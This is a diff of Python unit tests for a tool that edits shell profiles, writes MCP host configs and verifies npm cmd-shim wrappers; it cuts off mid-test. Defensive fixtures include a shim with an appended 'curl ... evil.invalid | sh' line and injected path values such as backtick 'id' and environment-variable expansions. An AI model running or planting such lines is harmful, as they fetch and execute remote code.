@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import contextlib
 import hashlib
 import json
 import os
@@ -8,6 +9,7 @@ import subprocess
 import sys
 import tempfile
 import threading
+import time
 import unittest
 from pathlib import Path
 from unittest import mock
@@ -229,6 +231,11 @@ class _Stdout:
     def readline(self) -> bytes:
         return self._proc._next_line()
 
+    def close(self) -> None:
+        # Closing the owned stdout wakes a pump blocked in readline, exactly
+        # like EOF from the real child's pipe.
+        self._proc._close()
+
 
 class _ScriptedProc:
     """In-memory Popen double: one scripted JSON response per request."""
@@ -291,15 +298,23 @@ class _ProbeRig:
         self.extra_roots: list[str] = []
         self.spawns: list[tuple[list[str], dict[str, str], str]] = []
         self.fixture_configs: list[bytes] = []
+        self.procs: list[_ScriptedProc] = []
         self.codex_available = True
         self.omp_available = True
         self.tools = PINNED_TOOLS
         self.server_version = GRAFT_VERSION
         self.runtime_status = "connected"
-        self.procs: list[_ScriptedProc] = []
         self.codex_skills_enabled = True
         self.omp_commands = None
         self.omp_fixture_files: dict[str, bytes] = {}
+        # R13: structured get_state dumpTools evidence (authoritative registry),
+        # deliberately independent of any prompt text. None builds the default
+        # six pinned mcp__sbtd_graft_* tool definitions with schemas.
+        self.omp_dump_tools = None
+        # Optional transform applied to the get_state response envelope, for
+        # strict-envelope negative evidence (event type, missing success...).
+        self.omp_envelope_transform = None
+        self.omp_system_prompt = "sbtd upgrade probe fixture prompt"
 
     def _mcp_handler(self, request: dict):
         method = request.get("method")
@@ -382,19 +397,42 @@ class _ProbeRig:
         if request_id is None:
             return None
         if rtype == "negotiate_protocol":
-            return {"id": request_id, "type": "response", "success": True, "data": {}}
-        if rtype == "get_state":
-            devices = " ".join(f"xd://mcp__sbtd_graft_{tool}" for tool in self.tools)
             return {
                 "id": request_id,
                 "type": "response",
+                "command": rtype,
                 "success": True,
-                "data": {"systemPrompt": [f"devices {devices}"]},
+                "data": {},
             }
+        if rtype == "get_state":
+            tools = self.omp_dump_tools
+            if tools is None:
+                tools = [
+                    {
+                        "name": f"mcp__sbtd_graft_{name}",
+                        "description": f"pinned graft tool {name}",
+                        "parameters": {"type": "object", "properties": {}},
+                    }
+                    for name in self.tools
+                ]
+            envelope = {
+                "id": request_id,
+                "type": "response",
+                "command": rtype,
+                "success": True,
+                "data": {
+                    "systemPrompt": [self.omp_system_prompt],
+                    "dumpTools": tools,
+                },
+            }
+            if self.omp_envelope_transform is not None:
+                envelope = self.omp_envelope_transform(envelope)
+            return envelope
         if rtype == "get_available_commands":
             return {
                 "id": request_id,
                 "type": "response",
+                "command": rtype,
                 "success": True,
                 "data": self.omp_commands if self.omp_commands is not None else [
                     {"name": f"skill:{name}"} for name in self.expected_skills
@@ -427,6 +465,7 @@ class _ProbeRig:
             return "/fake/bin/omp"
         return None
 
+
     def install(self) -> _ProbeRig:
         testcase = self.testcase
         testcase.addCleanup(self._restore)
@@ -435,15 +474,18 @@ class _ProbeRig:
             hosts._which,
             hosts.validate_project,
             hosts.validate_runtime,
+            hosts._HOST_TIMEOUT,
         )
         hosts._spawn = self._spawn
         hosts._which = self._which
         hosts.validate_project = lambda root: {"root": str(root)}
         hosts.validate_runtime = lambda node, cli: {"node": str(node), "cli": str(cli)}
+        # Bounded polling budget for scripted doubles; production value unchanged.
+        hosts._HOST_TIMEOUT = 3.0
         return self
 
     def _restore(self) -> None:
-        hosts._spawn, hosts._which, hosts.validate_project, hosts.validate_runtime = self._saved
+        hosts._spawn, hosts._which, hosts.validate_project, hosts.validate_runtime, hosts._HOST_TIMEOUT = self._saved
 
 
 # ---------------------------------------------------------------------------
@@ -1093,22 +1135,6 @@ class ShellResourceTests(unittest.TestCase):
             converged = hosts.build_host_resources(scope, package_root=package)
             self.assertEqual(converged[0]["classification"], "current")
 
-    def test_powershell_block_quoting(self) -> None:
-        with tempfile.TemporaryDirectory() as directory:
-            base = Path(directory).resolve()
-            package = _package(base)
-            profile = base / "profile.ps1"
-            bin_dir = base / "dir with space" / "it's"
-            scope = self._scope(base, profile, "powershell", bin_dir)
-            resources = hosts.build_host_resources(scope, package_root=package)
-            rendered = hosts.render_resource(resources[0])
-            quoted = str(bin_dir).replace("'", "''")
-            expected_line = (
-                f"$env:Path = '{quoted}'"
-                " + [IO.Path]::PathSeparator + $env:Path"
-            ).encode()
-            self.assertIn(expected_line, rendered)
-
     def test_posix_bin_with_space_and_apostrophe_is_quoted(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
             base = Path(directory).resolve()
@@ -1634,6 +1660,48 @@ class VerifyProbeTests(unittest.TestCase):
             self.assertEqual(checks["skills"]["skills"], ["beta-skill"])
             self.assertNotIn(SECRET, json.dumps(result))
 
+    def test_omp_envelope_must_be_a_successful_matching_response(self) -> None:
+        variants = {
+            "event-type": lambda envelope: envelope | {"type": "event"},
+            "success-absent": lambda envelope: {
+                key: value for key, value in envelope.items() if key != "success"
+            },
+            "success-invalid": lambda envelope: envelope | {"success": "yes"},
+            "command-mismatch": lambda envelope: envelope | {"command": "other"},
+            # A JSON-RPC-style result must never be promoted over the OMP
+            # authoritative data field (omp-data-only-original-red).
+            "result-smuggling": lambda envelope: envelope
+            | {
+                "result": envelope["data"],
+                "data": {"systemPrompt": [], "dumpTools": []},
+            },
+        }
+        for label, transform in variants.items():
+            with self.subTest(variant=label), tempfile.TemporaryDirectory() as directory:
+                base = Path(directory).resolve()
+                runtime = _runtime(base)
+                package = _package(base)
+                skills = _skills_root(base, ["beta-skill"])
+                project = base / "project"
+                project.mkdir()
+                host = _omp_host(
+                    base, runtime, skills_roots=[skills], project_roots=[project]
+                )
+                scope = {"hosts": [host], "skills_roots": [str(skills)]}
+                resource = hosts.build_host_resources(scope, package_root=package)[0]
+                _write(Path(host["config"]), hosts.render_resource(resource))
+                rig = _ProbeRig(self, ["beta-skill"]).install()
+                rig.omp_envelope_transform = transform
+                # The envelope matches the request id and carries fully shaped
+                # pinned tools, yet it is not the strict successful get_state
+                # response: its dumpTools must never become registry evidence.
+                result = hosts.verify_hosts(scope, package_root=package, probe=True)
+                entry = result["hosts"][0]
+                self.assertEqual(entry["status"], "fail", entry)
+                self.assertEqual(
+                    entry["host"]["checks"]["host_load"]["status"], "failed"
+                )
+
     def test_shell_probe_command_resolution(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
             base = Path(directory).resolve()
@@ -2141,6 +2209,44 @@ class SelectedExecutableIdentityTests(unittest.TestCase):
             self.assertEqual(check["status"], "failed")
             self.assertEqual(check["reason"], "graft-runtime-binding-mismatch")
 
+    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
+    def test_recognized_shim_through_selected_symlink_is_not_bound(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            package, runtime = _package(base), _runtime(base)
+            host = _codex_host(base, runtime)
+            cli = _npm_package_cli(base)
+            runtime["cli"] = str(cli)
+            actual = base / "actual-bin"
+            _npm_shims(actual)
+            bin_dir = base / "bin"
+            bin_dir.mkdir()
+            # npm links bin/graft to the package wrapper, and the wrapper
+            # computes basedir from the INVOKED path ($0 / %~dp0): a binding
+            # derived from the resolved wrapper's parent proves the wrong cli
+            # location, so a recognized shim behind a symlink is refused.
+            (bin_dir / "graft").symlink_to(actual / "graft")
+            profile = base / "selected-profile"
+            scope = {
+                "hosts": [host],
+                "shell_profiles": [
+                    {"path": str(profile), "shell": "bash", "bin": str(bin_dir)}
+                ],
+            }
+            resource = next(
+                item
+                for item in hosts.build_host_resources(scope, package_root=package)
+                if item["kind"] == "shell"
+            )
+            identity = resource["details"]["command_identity"]
+            self.assertIsNone(identity.get("shim"))
+            _write(profile, hosts.render_resource(resource))
+            check = hosts._shell_resolution(
+                scope["shell_profiles"][0], resource["details"]
+            )
+            self.assertEqual(check["status"], "failed")
+            self.assertEqual(check["reason"], "graft-runtime-binding-mismatch")
+
 
 class NativeWindowsBoundaryTests(unittest.TestCase):
     """Native Windows process environment stays explicit and private."""
@@ -2225,6 +2331,1179 @@ class NativePowerShellResolutionTests(unittest.TestCase):
                 "isolated-shell/selected-profile",
             )
 
+
+
+# ---------------------------------------------------------------------------
+# R01: UTF-16 PowerShell profiles keep BOM/encoding or fail closed pre-write
+# ---------------------------------------------------------------------------
+
+
+def _utf16le(text: str) -> bytes:
+    return b"\xff\xfe" + text.encode("utf-16-le")
+
+
+def _utf16be(text: str) -> bytes:
+    return b"\xfe\xff" + text.encode("utf-16-be")
+
+
+class Utf16PowerShellProfileTests(unittest.TestCase):
+    """UTF-16 profiles fail closed before any write; the original is untouched."""
+
+    def _scope(self, profile: Path, bin_dir: Path, decision: str = "replace") -> dict:
+        return {
+            "shell_profiles": [
+                {"path": str(profile), "shell": "powershell", "bin": str(bin_dir)}
+            ],
+            "decisions": {str(profile): decision},
+        }
+
+    def _assert_refused_untouched(
+        self, base: Path, profile: Path, bin_dir: Path, original: bytes
+    ) -> None:
+        package = _package(base)
+        resources = hosts.build_host_resources(
+            self._scope(profile, bin_dir), package_root=package
+        )
+        self.assertEqual(resources[0]["decision"], "blocked")
+        self.assertEqual(resources[0]["details"]["error_code"], "invalid-config")
+        self.assertEqual(profile.read_bytes(), original)
+        # Rendering is fail-closed too: never a partial or transcoded write.
+        with self.assertRaises(ContractError) as caught:
+            hosts.render_resource(resources[0])
+        self.assertEqual(caught.exception.code, "invalid-config")
+        self.assertEqual(profile.read_bytes(), original)
+
+    def test_utf16le_profile_is_refused_before_any_write(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            profile = base / "profile.ps1"
+            bin_dir = base / "bin"
+            original = _utf16le("Write-Output 'existing'\r\n$env:FOO = 'bar'\r\n")
+            _write(profile, original)
+            self._assert_refused_untouched(base, profile, bin_dir, original)
+
+    def test_utf16be_profile_is_refused_before_any_write(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            profile = base / "profile.ps1"
+            bin_dir = base / "bin"
+            original = _utf16be("# existing\r\n")
+            _write(profile, original)
+            self._assert_refused_untouched(base, profile, bin_dir, original)
+
+    def test_utf16_profile_with_managed_block_is_refused_untouched(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            profile = base / "profile.ps1"
+            bin_dir = base / "bin"
+            original = _utf16le(
+                "# sbtd-workflow-onboard:path:start\r\n"
+                "$env:PATH = 'C:\\bin' + [IO.Path]::PathSeparator + $env:PATH\r\n"
+                "# sbtd-workflow-onboard:path:end\r\n"
+            )
+            _write(profile, original)
+            self._assert_refused_untouched(base, profile, bin_dir, original)
+
+    def test_malformed_utf16_profile_is_refused_before_write(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            profile = base / "profile.ps1"
+            bin_dir = base / "bin"
+            broken = b"\xff\xfe" + b"A\x00B"  # odd byte count: undecodable UTF-16
+            _write(profile, broken)
+            self._assert_refused_untouched(base, profile, bin_dir, broken)
+
+    def test_utf8_bom_profile_keeps_existing_byte_pipeline(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            profile = base / "profile.ps1"
+            bin_dir = base / "bin"
+            original = b"\xef\xbb\xbf# utf8 bom comment\n"
+            _write(profile, original)
+            resources = hosts.build_host_resources(
+                self._scope(profile, bin_dir), package_root=_package(base)
+            )
+            self.assertEqual(resources[0]["decision"], "replace")
+            rendered = hosts.render_resource(resources[0])
+            self.assertTrue(rendered.startswith(original))
+            self.assertIn(b"# sbtd-workflow-onboard:path:start\n", rendered)
+
+
+
+
+# ---------------------------------------------------------------------------
+# R04: Codex MCP target is canonically config_home/config.toml
+# ---------------------------------------------------------------------------
+
+
+class CodexCanonicalConfigTests(unittest.TestCase):
+    def test_non_canonical_codex_config_is_blocked_before_write(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            host = _codex_host(base, runtime)
+            host["config"] = str(base / "account" / ".codex" / "custom.toml")
+            resources = hosts.build_host_resources(
+                {"hosts": [host]}, package_root=_package(base)
+            )
+            self.assertEqual(resources[0]["decision"], "blocked")
+            self.assertEqual(resources[0]["details"]["error_code"], "scope-conflict")
+
+    def test_aligned_content_in_non_canonical_file_is_never_alignment(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            package = _package(base)
+            canonical = _codex_host(base, runtime)
+            rendered = hosts.render_resource(
+                hosts.build_host_resources({"hosts": [canonical]}, package_root=package)[0]
+            )
+            host = _codex_host(base, runtime, host_id="codex-custom")
+            host["config"] = str(base / "account" / ".codex" / "custom.toml")
+            _write(Path(host["config"]), rendered)
+            resources = hosts.build_host_resources({"hosts": [host]}, package_root=package)
+            self.assertEqual(resources[0]["decision"], "blocked")
+            self.assertEqual(resources[0]["details"]["error_code"], "scope-conflict")
+
+    def test_render_rejects_non_canonical_codex_config(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            runtime = _runtime(base)
+            host = _codex_host(base, runtime)
+            host["config"] = str(base / "account" / ".codex" / "custom.toml")
+            resource = hosts.build_host_resources(
+                {"hosts": [host]}, package_root=_package(base)
+            )[0]
+            with self.assertRaises(ContractError) as caught:
+                hosts.render_resource(resource)
+            self.assertEqual(caught.exception.code, "scope-conflict")
+
+
+# ---------------------------------------------------------------------------
+# R06: real npm cmd-shim wrappers must provably bind the selected node/cli
+# ---------------------------------------------------------------------------
+
+# Exact npm cmd-shim 9.0.2 generator output (bundled with npm 12.1.0 through
+# bin-links; generator source read at npm/node_modules/bin-links/node_modules/
+# cmd-shim/lib/index.js) for a node-shebang target at NPM_SHIM_REL relative to
+# the shim's own bin directory.
+NPM_SHIM_REL = "../node_modules/@nanonets/graft/dist/cli.js"
+NPM_SHIM_SH = (
+    "#!/bin/sh\n"
+    'basedir=$(dirname "$(echo "$0" | sed -e \'s,\\\\,/,g\')")\n'
+    'basedir_win="$basedir"\n'
+    "\n"
+    "case `uname -a` in\n"
+    "  *CYGWIN*|*MINGW*|*MSYS*)\n"
+    "    if command -v cygpath > /dev/null 2>&1; then\n"
+    "      basedir_win=`cygpath -w \"$basedir\"`\n"
+    "    fi\n"
+    "  ;;\n"
+    "  *WSL2*)\n"
+    "    if command -v wslpath > /dev/null 2>&1; then\n"
+    "      basedir_win=\"$(wslpath -w \"$basedir\" 2> /dev/null)\"\n"
+    '      if [ $? -ne 0 ] || [ -z "$basedir_win" ]; then\n'
+    '        echo "Error: wslpath failed to convert path. WSL environment may be misconfigured." >&2\n'
+    "        exit 1\n"
+    "      fi\n"
+    "    fi\n"
+    "  ;;\n"
+    "esac\n"
+    "\n"
+    'PROG_EXE="$basedir/node.exe"\n'
+    'if ! [ -x "$PROG_EXE" ]; then\n'
+    '  PROG_EXE="$basedir/node"\n'
+    '  if ! [ -x "$PROG_EXE" ]; then\n'
+    "    PROG_EXE=node\n"
+    '    if ! [ -x "$PROG_EXE" ]; then\n'
+    "      PROG_EXE=node.exe\n"
+    "    fi\n"
+    "  fi\n"
+    "fi\n"
+    "\n"
+    'exec "$PROG_EXE"  "$basedir_win/' + NPM_SHIM_REL + '" "$@"\n'
+)
+NPM_SHIM_CMD = "\r\n".join(
+    [
+        "@ECHO off",
+        "GOTO start",
+        ":find_dp0",
+        "SET dp0=%~dp0",
+        "EXIT /b",
+        ":start",
+        "SETLOCAL",
+        "CALL :find_dp0",
+        "",
+        'IF EXIST "%dp0%\\node.exe" (',
+        '  SET "_prog=%dp0%\\node.exe"',
+        ") ELSE (",
+        '  SET "_prog=node"',
+        ")",
+        "",
+        'endLocal & goto #_undefined_# 2>NUL || title %COMSPEC% & '
+        'set PATHEXT=%PATHEXT:;.JS;=;% & "%_prog%"  "%dp0%\\'
+        + NPM_SHIM_REL.replace("/", "\\")
+        + '" %*',
+    ]
+) + "\r\n"
+NPM_SHIM_PS1 = (
+    "#!/usr/bin/env pwsh\n"
+    "$basedir=Split-Path $MyInvocation.MyCommand.Definition -Parent\n"
+    "\n"
+    '$exe=""\n'
+    'if ($PSVersionTable.PSVersion -lt "6.0" -or $IsWindows) {\n'
+    "  # Fix case when both the Windows and Linux builds of Node\n"
+    "  # are installed in the same directory\n"
+    '  $exe=".exe"\n'
+    "}\n"
+    "$ret=0\n"
+    'if (Test-Path "$basedir/node$exe") {\n'
+    "  # Support pipeline input\n"
+    "  if ($MyInvocation.ExpectingInput) {\n"
+    '    $input | & "$basedir/node$exe"  "$basedir/' + NPM_SHIM_REL + '" $args\n'
+    "  } else {\n"
+    '    & "$basedir/node$exe"  "$basedir/' + NPM_SHIM_REL + '" $args\n'
+    "  }\n"
+    "  $ret=$LASTEXITCODE\n"
+    "} else {\n"
+    "  # Support pipeline input\n"
+    "  if ($MyInvocation.ExpectingInput) {\n"
+    '    $input | & "node$exe"  "$basedir/' + NPM_SHIM_REL + '" $args\n'
+    "  } else {\n"
+    '    & "node$exe"  "$basedir/' + NPM_SHIM_REL + '" $args\n'
+    "  }\n"
+    "  $ret=$LASTEXITCODE\n"
+    "}\n"
+    "exit $ret\n"
+)
+
+
+def _npm_package_cli(base: Path, package: str = "@nanonets/graft") -> Path:
+    cli = base / "node_modules" / Path(package) / "dist" / "cli.js"
+    _write(cli, b"#!/usr/bin/env node\n// pinned cli fixture\n")
+    return cli
+
+
+def _npm_shims(bin_dir: Path, rel: str = NPM_SHIM_REL) -> None:
+    """The three files cmd-shim 9.0.2 writes for one bin entry."""
+    bin_dir.mkdir(parents=True, exist_ok=True)
+    shim = bin_dir / "graft"
+    shim.write_bytes(NPM_SHIM_SH.replace(NPM_SHIM_REL, rel).encode("utf-8"))
+    shim.chmod(0o755)
+    (bin_dir / "graft.cmd").write_bytes(
+        NPM_SHIM_CMD.replace(
+            NPM_SHIM_REL.replace("/", "\\"), rel.replace("/", "\\")
+        ).encode("utf-8")
+    )
+    (bin_dir / "graft.ps1").write_bytes(
+        NPM_SHIM_PS1.replace(NPM_SHIM_REL, rel).encode("utf-8")
+    )
+
+
+class NpmShimBindingTests(unittest.TestCase):
+    def _profile_scope(self, base: Path, runtime: dict, bin_dir: Path):
+        host = _codex_host(base, runtime)
+        profile = base / "selected-profile"
+        scope = {
+            "hosts": [host],
+            "shell_profiles": [
+                {"path": str(profile), "shell": "bash", "bin": str(bin_dir)}
+            ],
+        }
+        return scope, profile
+
+    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
+    def test_real_npm_sh_shim_binds_selected_cli(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            package = _package(base)
+            runtime = _runtime(base)
+            Path(runtime["node"]).chmod(0o755)
+            cli = _npm_package_cli(base)
+            runtime["cli"] = str(cli)
+            bin_dir = base / "bin"
+            _npm_shims(bin_dir)
+            scope, profile = self._profile_scope(base, runtime, bin_dir)
+            resource = next(
+                item
+                for item in hosts.build_host_resources(scope, package_root=package)
+                if item["kind"] == "shell"
+            )
+            identity = resource["details"]["command_identity"]
+            self.assertEqual(
+                (identity.get("shim") or {}).get("target"), str(cli.resolve())
+            )
+            _write(profile, hosts.render_resource(resource))
+            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
+                "shell_profiles"
+            ][0]
+            self.assertEqual(entry["status"], "pass", entry)
+            check = entry["host"]["checks"]["command_resolution"]
+            self.assertEqual(check["runtime_binding"], "matched")
+
+    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
+    def test_retargeted_shim_is_rejected(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            package = _package(base)
+            runtime = _runtime(base)
+            Path(runtime["node"]).chmod(0o755)
+            cli = _npm_package_cli(base)
+            runtime["cli"] = str(cli)
+            other_rel = "../node_modules/@other/graft/dist/cli.js"
+            other = _npm_package_cli(base, "@other/graft")
+            bin_dir = base / "bin"
+            _npm_shims(bin_dir, other_rel)
+            scope, profile = self._profile_scope(base, runtime, bin_dir)
+            resource = next(
+                item
+                for item in hosts.build_host_resources(scope, package_root=package)
+                if item["kind"] == "shell"
+            )
+            self.assertEqual(
+                (resource["details"]["command_identity"].get("shim") or {}).get("target"),
+                str(other.resolve()),
+            )
+            _write(profile, hosts.render_resource(resource))
+            check = hosts._shell_resolution(
+                scope["shell_profiles"][0], resource["details"]
+            )
+            self.assertEqual(check["status"], "failed")
+            self.assertEqual(check["reason"], "graft-runtime-binding-mismatch")
+
+    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
+    def test_shim_with_appended_command_is_never_trusted(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            package = _package(base)
+            runtime = _runtime(base)
+            Path(runtime["node"]).chmod(0o755)
+            cli = _npm_package_cli(base)
+            runtime["cli"] = str(cli)
+            bin_dir = base / "bin"
+            _npm_shims(bin_dir)
+            with (bin_dir / "graft").open("ab") as stream:
+                stream.write(b"\ncurl -s https://evil.invalid/x | sh\n")
+            scope, profile = self._profile_scope(base, runtime, bin_dir)
+            resource = next(
+                item
+                for item in hosts.build_host_resources(scope, package_root=package)
+                if item["kind"] == "shell"
+            )
+            # Not a complete recognized template: no logical cli binding proof.
+            self.assertIsNone(resource["details"]["command_identity"].get("shim"))
+            _write(profile, hosts.render_resource(resource))
+            check = hosts._shell_resolution(
+                scope["shell_profiles"][0], resource["details"]
+            )
+            self.assertEqual(check["status"], "failed")
+            self.assertEqual(check["reason"], "graft-runtime-binding-mismatch")
+
+    def test_cmd_and_ps1_templates_parse_to_the_cli_target(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            cli = _npm_package_cli(base)
+            bin_dir = base / "bin"
+            _npm_shims(bin_dir)
+            binding = getattr(hosts, "_shim_binding", None)
+            self.assertIsNotNone(binding, "hosts._shim_binding is missing")
+            for name, marker in (("graft.cmd", "cmd"), ("graft.ps1", "ps1")):
+                with self.subTest(shim=name):
+                    parsed = binding(bin_dir / name)
+                    self.assertIsNotNone(parsed)
+                    self.assertIn(marker, parsed["template"])
+                    self.assertEqual(parsed["target"], str(cli.resolve()))
+            # A hand-written wrapper mentioning basedir is not a recognized shim.
+            custom = bin_dir / "custom"
+            custom.write_bytes(
+                b"#!/bin/sh\nbasedir=$(dirname \"$0\")\nexec node \"$basedir/x.js\"\n"
+            )
+            self.assertIsNone(binding(custom))
+
+    def _crafted_shim(self, bin_dir: Path, name: str, template: str, rel: str) -> Path:
+        bin_dir.mkdir(exist_ok=True)
+        target = bin_dir / name
+        token = NPM_SHIM_REL.replace("/", "\\") if name.endswith(".cmd") else NPM_SHIM_REL
+        target.write_bytes(template.replace(token, rel).encode("utf-8"))
+        return target
+
+    def test_absolute_or_interpolated_shim_targets_are_unprovable(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            bin_dir = base / "bin"
+            binding = hosts._shim_binding
+            # The proof path math must match the shell's own concatenation:
+            # absolute, drive-relative or expansion-bearing captures invoke a
+            # different file than Path.parent / rel, so they are not bindings.
+            rejected = (
+                ("graft", NPM_SHIM_SH, "/etc/evil/cli.js"),
+                ("graft", NPM_SHIM_SH, "$HOME/evil/cli.js"),
+                ("graft", NPM_SHIM_SH, "`id`/cli.js"),
+                ("graft", NPM_SHIM_SH, "C:evil/cli.js"),
+                # cmd-shim normalizes sh/ps1 target backslashes to "/", so a
+                # backslash capture is an unknown wrapper whose double-quoted
+                # shell reading diverges from the proof path math.
+                ("graft", NPM_SHIM_SH, "..\\node_modules\\x\\dist\\cli.js"),
+                ("graft", NPM_SHIM_SH, "pkg\\\\dist\\cli.js"),
+                ("graft.ps1", NPM_SHIM_PS1, "..\\node_modules\\x\\dist\\cli.js"),
+                # cmd.exe delayed expansion substitutes !VAR! even inside
+                # quotes, so it is refused exactly like %VAR%.
+                ("graft.cmd", NPM_SHIM_CMD, "!TOOLS!\\evil\\cli.js"),
+                # NUL/control bytes must never reach path resolution (it
+                # raises outside the contract): not a provable binding.
+                ("graft", NPM_SHIM_SH, "pkg\x00dist/cli.js"),
+                ("graft.cmd", NPM_SHIM_CMD, "pkg\tdist\\cli.js"),
+                ("graft.cmd", NPM_SHIM_CMD, "%APPDATA%\\evil\\cli.js"),
+                ("graft.cmd", NPM_SHIM_CMD, "D:\\pkg\\cli.js"),
+                ("graft.cmd", NPM_SHIM_CMD, "\\pkg\\cli.js"),
+                ("graft.ps1", NPM_SHIM_PS1, "$HOME/evil/cli.js"),
+                ("graft.ps1", NPM_SHIM_PS1, "/etc/evil/cli.js"),
+            )
+            for name, template, rel in rejected:
+                with self.subTest(shim=name, rel=rel):
+                    target = self._crafted_shim(bin_dir, name, template, rel)
+                    self.assertIsNone(binding(target))
+                    target.unlink()
+            accepted = (
+                ("graft", NPM_SHIM_SH, NPM_SHIM_REL),
+                ("graft.cmd", NPM_SHIM_CMD, "..\\node_modules\\pkg with space\\dist\\cli.js"),
+                ("graft.ps1", NPM_SHIM_PS1, "../node_modules/päkete/dist/cli.js"),
+            )
+            for name, template, rel in accepted:
+                with self.subTest(shim=name, rel=rel):
+                    target = self._crafted_shim(bin_dir, name, template, rel)
+                    self.assertIsNotNone(binding(target))
+                    target.unlink()
+
+    def test_oversized_wrapper_is_never_read(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            bin_dir = base / "bin"
+            bin_dir.mkdir()
+            big = bin_dir / "graft"
+            big.write_bytes(NPM_SHIM_SH.encode("utf-8") + b"#" * (128 * 1024))
+            # The 64KiB bound is enforced from file metadata before any
+            # allocation: the safe file open is never invoked.
+            with mock.patch.object(
+                hosts,
+                "open_regular_file",
+                side_effect=AssertionError("unbounded read"),
+            ):
+                self.assertIsNone(hosts._shim_binding(big))
+
+    def test_growth_past_bound_is_rejected_with_bounded_read(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            bin_dir = base / "bin"
+            bin_dir.mkdir()
+            wrapper = bin_dir / "graft"
+            content = NPM_SHIM_SH.encode("utf-8")
+            # Exactly at the bound: lstat passes, then the wrapper "grows"
+            # mid-read. The single safe-handle read never requests more than
+            # MAX+1 bytes and the oversized content is rejected.
+            wrapper.write_bytes(
+                content + b"#" * (hosts._NPM_SHIM_MAX_BYTES - len(content))
+            )
+            requested: list[int] = []
+            real_open = hosts.open_regular_file
+
+            @contextlib.contextmanager
+            def growing(path, label):
+                with real_open(path, label) as handle:
+                    class _Grown:
+                        def read(self, size: int = -1) -> bytes:
+                            requested.append(size)
+                            return handle.read(size) + b"#"
+
+                    yield _Grown()
+
+            with mock.patch.object(hosts, "open_regular_file", growing):
+                self.assertIsNone(hosts._shim_binding(wrapper))
+            self.assertEqual(requested, [hosts._NPM_SHIM_MAX_BYTES + 1])
+
+    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
+    def test_profile_returning_before_block_never_false_passes(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            package = _package(base)
+            runtime = _runtime(base)
+            cli = _npm_package_cli(base)
+            runtime["cli"] = str(cli)
+            bin_dir = base / "bin"
+            _npm_shims(bin_dir)
+            # The selected runtime node lives in the same bin as graft, so a
+            # probe that seeds PATH from runtime directories can resolve
+            # graft even when the profile never exposes bin.
+            node = bin_dir / "node"
+            node.write_bytes(b"#!/bin/sh\nexit 0\n")
+            node.chmod(0o755)
+            runtime["node"] = str(node)
+            scope, profile = self._profile_scope(base, runtime, bin_dir)
+            resource = next(
+                item
+                for item in hosts.build_host_resources(scope, package_root=package)
+                if item["kind"] == "shell"
+            )
+            # A valid profile that returns BEFORE the managed block; only a
+            # seeded probe PATH could still resolve graft (false pass).
+            _write(profile, b"return 0\n" + hosts.render_resource(resource))
+            check = hosts._shell_resolution(
+                scope["shell_profiles"][0], resource["details"]
+            )
+            self.assertEqual(check["status"], "failed")
+            self.assertEqual(check["reason"], "graft-not-resolved")
+
+
+class NativeWindowsShimBindingTests(unittest.TestCase):
+    """Real npm cmd-shim wrappers on native Windows (Git Bash / PowerShell)."""
+
+    def _scope(self, base: Path, runtime: dict, bin_dir: Path, shell: str = "bash"):
+        host = _codex_host(base, runtime)
+        profile = base / ("profile.ps1" if shell == "powershell" else ".bashrc")
+        return {
+            "hosts": [host],
+            "shell_profiles": [
+                {"path": str(profile), "shell": shell, "bin": str(bin_dir)}
+            ],
+        }, profile
+
+    def _runtime_with_exe_node(self, base: Path) -> dict:
+        runtime = _runtime(base)
+        node = Path(runtime["node"]).with_suffix(".exe")
+        shutil.copyfile(sys.executable, node)
+        runtime["node"] = str(node)
+        return runtime
+
+    @unittest.skipUnless(os.name == "nt" and shutil.which("bash"), "native Git Bash required")
+    def test_gitbash_binds_real_npm_sh_shim_to_selected_runtime(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            base = Path(directory).resolve()
+            package = _package(base)
+            runtime = self._runtime_with_exe_node(base)
+            cli = _npm_package_cli(base)
+            runtime["cli"] = str(cli)
+            bin_dir = base / "bin with space"
+            _npm_shims(bin_dir)
+            scope, profile = self._scope(base, runtime, bin_dir)
+            resource = next(
+                item
+                for item in hosts.build_host_resources(scope, package_root=package)
+                if item["kind"] == "shell"
+            )
+            self.assertEqual(
+                (resource["details"]["command_identity"].get("shim") or {}).get("target"),
+                str(cli.resolve()),
+            )
+            _write(profile, hosts.render_resource(resource))
+            entry = hosts.verify_hosts(scope, package_root=package, probe=True)[
+                "shell_profiles"
+            ][0]
+            self.assertEqual(entry["status"], "pass", entry)
+
+    @unittest.skipUnless(
